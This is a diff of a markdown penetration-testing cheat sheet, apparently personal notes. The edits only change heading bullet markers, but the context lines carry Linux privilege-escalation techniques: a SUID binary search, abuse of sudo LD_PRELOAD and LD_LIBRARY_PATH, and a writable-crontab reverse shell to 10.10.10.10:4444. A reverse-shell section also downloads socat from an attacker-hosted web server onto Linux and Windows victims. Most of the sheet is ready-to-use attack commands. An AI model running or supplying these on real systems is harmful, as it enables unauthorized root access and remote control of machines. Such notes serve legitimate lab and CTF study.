@@ -6,12 +6,12 @@
 ### > List sudo capability of the current user
 ```sudo -l```
 
-### * Find interesting binaries that can exploit shell
+### > Find interesting binaries that can exploit shell
 ```find / -perm /6000 2>/dev/null | grep '/bin'```
 
-### * https://gtfobins.github.io/ followed the interesting tools that can exploit 
+### > https://gtfobins.github.io/ followed the interesting tools that can exploit 
 
-### * env_keep exploit when ```sudo -l``` and ```ddl <thetargetedprogram>``` to find its libraries
+### > env_keep exploit when ```sudo -l``` and ```ddl <thetargetedprogram>``` to find its libraries
 
 #### - Take advantage of LD_PRELOAD
 a. compile the library.
@@ -50,12 +50,12 @@ void _init() {
 c. sudo program with the LD_LIBRARY_PATH
 ```sudo LD_LIBRARY_PATH=/tmp <programname>```
 
-### Cron job if it's writable on /etc/crontab file (can use any available type of reverse shell http://revshells.com/ ):
+### > Cron job if it's writable on /etc/crontab file (can use any available type of reverse shell http://revshells.com/ ):
 ```#!/bin/bash
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
-### Automated tools
+### > Automated tools
 LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 LinEnum: https://github.com/rebootuser/LinEnum
 LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
@@ -65,9 +65,9 @@ Linux Priv Checker: https://github.com/linted/linuxprivchecker
 
 # Reverse Shell
 ***
-### * https://www.revshells.com/
-### * MonkeyPenTest
-### * Start webserver using python ```sudo python3 -m http.server 80``` then download files into victim shell 
+### > https://www.revshells.com/
+### > MonkeyPenTest
+### > Start webserver using python ```sudo python3 -m http.server 80``` then download files into victim shell 
 Linux :"wget <LOCAL-IP>/socat -O /tmp/socat"
 Windows: "Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe"
 
